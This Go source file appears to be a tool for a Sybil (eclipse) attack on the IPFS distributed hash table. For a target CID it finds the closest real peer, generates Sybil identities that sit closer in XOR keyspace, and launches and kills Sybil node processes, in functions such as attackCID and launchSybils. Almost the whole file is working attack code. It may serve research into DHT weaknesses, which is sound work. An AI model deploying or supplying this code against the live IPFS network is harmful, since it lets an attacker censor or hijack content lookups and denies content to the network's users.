package main

import (
	"bytes"
	"fmt"

	kspace "github.com/libp2p/go-libp2p-kbucket/keyspace"
	mh "github.com/multiformats/go-multihash"

	"log"
	"os"
	"os/exec"
	"strconv"
	"time"
	"context"

	"github.com/schollz/progressbar/v3"
)

func appendTextToFile(filename string, text string) error {
	f, err := os.OpenFile(filename, os.O_RDWR|os.O_APPEND, 0660)
	defer f.Close()
	_, err = f.WriteString(text)

	return err
}

func getCIDWithoutAdding(filename string) []byte {
	// Requires IPFS daemon to be running
	out, err := exec.Command(IPFS_PATH, "add", "-q", "--only-hash", filename).Output()
	if err != nil {
		log.Println("getCIDWithoutAdding() failed!")
		log.Println(err)
		return nil
	}

	return out
}

func getCurrentClosest(CID string, timeout time.Duration) (string, error) {
	// Requires IPFS daemon to be running
	ctxWithTimeout, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	cmd := exec.CommandContext(ctxWithTimeout, IPFS_PATH, "dht", "query", CID)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		log.Printf("getCurrentClosest() with CID: %s failed", CID)
		fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
		// log.Fatal(err)
	}

	return out.String(), err
}

func killSybils(sybils []*exec.Cmd) {
	fmt.Println("Killing old DHT Sybils...")

	for _, cmd := range sybils {
		if err := cmd.Process.Kill(); err != nil {
			log.Fatal("failed to kill Sybil process: ", err)
		}
		cmd.Wait()
	}
}

func launchSybils(privKeyList []string, pubkeylist []string) []*exec.Cmd {
	portNumber := 63800
	//portNumber := 0
	var sybils []*exec.Cmd
	for i := 0; i < len(privKeyList); i++ {
		fmt.Println("Starting DHT Sybil with ID:", pubkeylist[i])
		portNumberStr := strconv.Itoa(portNumber)
		cmd := exec.Command(SYBIL_NODE_PATH, "--privKey", privKeyList[i], "--port", portNumberStr)
		fmt.Printf("Executing: %s --privKey %s --port %s \n", SYBIL_NODE_PATH, privKeyList[i], portNumberStr)
		cmd.Dir = "./"
		sybils = append(sybils, cmd)
		// open the out file for writing
		outfile, err := os.Create("./out_" + portNumberStr + ".txt")
		if err != nil {
			panic(err)
		}
		defer outfile.Close()
		cmd.Stdout = outfile

		if err := cmd.Start(); err != nil {
			log.Printf("Failed to start Sybil: %v", err)
			os.Exit(1)
		}
		portNumber = portNumber + 1
	}
	time.Sleep(30 * time.Second)

	return sybils
}

func attackCID(targetCID string, currentClosest string, peerIdList []string, numberOfSybils int) ([]string, []string, error) {

	id_mh, _ := mh.FromB58String(targetCID)
	targetCIDKey := kspace.XORKeySpace.Key(id_mh)
	fmt.Println("\n####################################################")
	fmt.Printf("CID:%s\n", targetCID)
	fmt.Println("####################################################")
	currentClosestByte, _ := mh.FromB58String(currentClosest)
	currentClosestKey := kspace.XORKeySpace.Key(currentClosestByte)
	minDistance := currentClosestKey.Distance(targetCIDKey)
	var keyList []kspace.Key

	for _, peerId := range peerIdList {
		peerByte, _ := mh.FromB58String(peerId)
		peerKey := kspace.XORKeySpace.Key(peerByte)
		keyList = append(keyList, peerKey)
		distance := peerKey.Distance(targetCIDKey)
		if distance.Cmp(minDistance) == -1 {
			currentClosest = peerId
			minDistance = distance
		}
	}
	fmt.Printf("\n\n")
	fmt.Printf("The closest node is %s with distance %d\n", currentClosest, minDistance)
	fmt.Printf("\n\n")

	var sybilkeylist []kspace.Key
	var sybilcidlist []string
	var pkeylist []string
	fmt.Printf("Generating %d Sybil identities closer to the CID than the currently closest peer\n", numberOfSybils)
	bar := progressbar.Default(int64(numberOfSybils))

	for i := 0; i < numberOfSybils; i++ {
		fmt.Printf("generating new key #%d\n", i)
		sybil, sybilkey, privatekey, err := generateNewKey(currentClosest, targetCIDKey)
		if err != nil {
			return nil, nil, err
		}
		sybilkeylist = append(sybilkeylist, sybilkey)
		sybilcidlist = append(sybilcidlist, sybil)
		pkeylist = append(pkeylist, privatekey)
		bar.Add(1)
	}
	fmt.Println()

	return pkeylist, sybilcidlist, nil
}
